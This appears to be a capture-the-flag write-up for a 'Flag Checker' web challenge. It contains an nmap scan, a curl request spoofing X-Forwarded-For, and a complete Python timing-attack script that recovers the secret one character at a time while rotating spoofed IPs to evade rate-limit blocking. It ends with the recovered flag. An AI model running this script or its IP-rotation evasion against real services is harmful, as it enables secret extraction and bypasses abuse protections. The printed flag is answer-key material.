# Prompt

![](/huntress_2025/Day_08/Flag_Checker/Challenge_FlagChecker.png "Challenge Prompt")

# Solution

- This challenge provides a website that you must attack to get the flag, but after so many attempts it will block you. So instead of attacking the proxied port on port 80, we can nmap it to see if it is hosting the web page on another port. If we do, we will find port 5000 which can be used to bypass the full block of our client. 

```bash
nmap -A --top-ports=250 CHALLENGE_IP
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-08 19:53 EDT
Stats: 0:00:23 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.30% done; ETC: 19:54 (0:00:00 remaining)
Nmap scan report for CHALLENGE_IP
Host is up (0.035s latency).
Not shown: 247 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 39:89:bd:05:20:38:4b:93:5a:c7:bb:b1:8b:55:6a:94 (ECDSA)
|_  256 da:d4:6f:ce:4a:62:e3:eb:73:96:e1:b4:c7:9d:a6:e5 (ED25519)
80/tcp   open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Acme Internal Portal \xE2\x80\x94 Verification Service
5000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.11.13)
|_http-title: Acme Internal Portal \xE2\x80\x94 Verification Service
|_http-server-header: Werkzeug/3.1.3 Python/3.11.13
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=10/8%OT=22%CT=1%CU=42646%PV=Y%DS=3%DC=T%G=Y%TM=68E6F99
OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=108%TI=Z%CI=Z%TS=A)SEQ(SP=1
OS:04%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)SEQ(SP=105%GCD=1%ISR=109%TI=Z%CI=Z%II=I%
OS:TS=A)SEQ(SP=105%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FE%GCD=1%ISR=10
OS:8%TI=Z%CI=Z%TS=A)OPS(O1=M578ST11NW7%O2=M578ST11NW7%O3=M578NNT11NW7%O4=M5
OS:78ST11NW7%O5=M578ST11NW7%O6=M578ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3
OS:%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M578NNSNW7%CC=Y%Q=)T1(R=Y%DF
OS:=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z
OS:%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=
OS:Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%R
OS:IPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   38.24 ms 10.200.0.1
2   ...
3   29.95 ms CHALLENGE_IP

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.40 seconds
```

- So port 80/nginx is a reverse proxy which controls the blocking globally. But if you access the web app over port 5000, it is much easier to access and send requests. The caveat is that you need to use X-Forwarded-For: in the request headers, but it lets you easily bypass the IP block if you’ve sent too many requests by changing the IP in that header. 

```bash
curl -H 'X-Forwarded-For: 127.0.0.2' 'http://CHALLENGE_IP:5000/'
```

![Step 1 - Testing](/huntress_2025/Day_08/Flag_Checker/Step_1_Timing.png "Step 1 - Testing")

- This is a timing attack, here’s the code to request the flag using Python. Since you are using port 5000, you have to set the `X-Forwarded-For:`, we rotate it so every 10 attempts so we don't get blocked for "hacking" 

```python
#!/usr/bin/env python3
import requests, time

BASE = "http://10.1.119.213:5000/submit"
PREFIX, SUFFIX = "flag{", "}"
INNER_LEN = 32
CHARSET = "abcdef0123456789"

START_KNOWN = ""

XFF_BASE, XFF_START, XFF_END = "56.1.24.", 1, 255
ROTATE_EVERY_REQUESTS = 10
BLOCK_THRESHOLD = 0.002

DELTA = 0.100
TIMEOUT = 8.0
UA = "ctf-test/1.0"

STOP_ON_SUCCESS = True
CONFIRM_ON_SUCCESS = True
CONFIRM_EPS = 0.020

sess = requests.Session()
sess.headers.update({"User-Agent": UA})

XFFS = [f"{XFF_BASE}{i}" for i in range(XFF_START, XFF_END + 1)]
_xff_idx = 0
_req_counter = 0

def rotate_xff(force=False):
    global _xff_idx
    if force:
        _xff_idx = (_xff_idx + 1) % len(XFFS)
        return

    if _req_counter > 0 and (_req_counter % ROTATE_EVERY_REQUESTS == 0):
        _xff_idx = (_xff_idx + 1) % len(XFFS)

def current_xff():
    return XFFS[_xff_idx]

def parse_xrt(resp: requests.Response) -> float:
    for k, v in resp.headers.items():
        if k.lower() == "x-response-time":
            try:
                val = float(v.strip())
                return val/1000.0 if val > 5.0 else val
            except Exception:
                break

    return resp.elapsed.total_seconds()

def get_once(flag_value: str):
    """One GET with block detection & XFF rotation if needed."""
    global _req_counter
    attempts = 0
    while True:
        headers = {"X-Forwarded-For": current_xff()}
        r = sess.get(BASE, params={"flag": flag_value}, headers=headers,
                     timeout=TIMEOUT, allow_redirects=False)
        _req_counter += 1
        xrt = parse_xrt(r)
        rotate_xff(force=False)

        if xrt < BLOCK_THRESHOLD:
            rotate_xff(force=True)
            attempts += 1
            if attempts >= len(XFFS):
                return xrt, r.status_code, len(r.content), headers["X-Forwarded-For"]
            
            continue
        return xrt, r.status_code, len(r.content), headers["X-Forwarded-For"]

def build_candidate(known_inner: str, ch: str) -> str:
    rem = INNER_LEN - (len(known_inner) + 1)
    return f"{PREFIX}{known_inner}{ch}{'0'*rem}{SUFFIX}"

def extract():
    known = START_KNOWN
    print(f"[+] Fast extraction. inner_len={INNER_LEN} seed='{START_KNOWN}' delta={DELTA:.3f}s")

    for pos in range(len(START_KNOWN) + 1, INNER_LEN + 1):
        print(f"\n[+] Position {pos}/{INNER_LEN}")
        baseline = None
        chosen = None

        for ch in CHARSET:
            candidate = build_candidate(known, ch)
            xrt, status, length, used_xff = get_once(candidate)
            if baseline is None or xrt < baseline:
                baseline = xrt
            print(f"    {ch}  XFF={used_xff}  XRT={xrt:.6f}s  baseline={baseline:.6f}s  (Δ={xrt-baseline:+.6f}s)")

            if STOP_ON_SUCCESS and (xrt >= baseline + DELTA):
                if CONFIRM_ON_SUCCESS:
                    xrt2, _, _, used_xff2 = get_once(candidate)
                    print(f"      confirm {ch}: XFF={used_xff2}  XRT={xrt2:.6f}s")
                    if xrt2 + CONFIRM_EPS >= baseline + DELTA:
                        chosen = ch
                        break
                    else:
                        continue
                else:
                    chosen = ch
                    break

        if not chosen:
            slowest = (None, -1.0)
            for ch in CHARSET:
                candidate = build_candidate(known, ch)
                xrt, _, _, used_xff = get_once(candidate)
                print(f"    recheck {ch}  XFF={used_xff}  XRT={xrt:.6f}s  baseline={baseline:.6f}s")
                if xrt >= baseline + DELTA and chosen is None:
                    chosen = ch
                    break
                if xrt > slowest[1]:
                    slowest = (ch, xrt)

            if not chosen:
                chosen = slowest[0]
                print(f"    [!] No ≥ {DELTA:.3f}s jump; taking slowest '{chosen}'")

        known += chosen
        print(f"[=] Found '{chosen}'  -> {known}")

    flag = f"{PREFIX}{known}{SUFFIX}"
    print(f"\n[!!!] Candidate flag: {flag}")
    return flag

if __name__ == "__main__":
    try:
        extract()
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
```

![Step 2 - Timing Attack](/huntress_2025/Day_08/Flag_Checker/Step_2_timing_Attack.png "Step 2 - Timing Attack")

![Step 3 - Solution](/huntress_2025/Day_08/Flag_Checker/Step_3_Solution.png "Step 3 - Solution")

# Flag

- flag{77ba0346d9565e77344b9fe40ecf1369}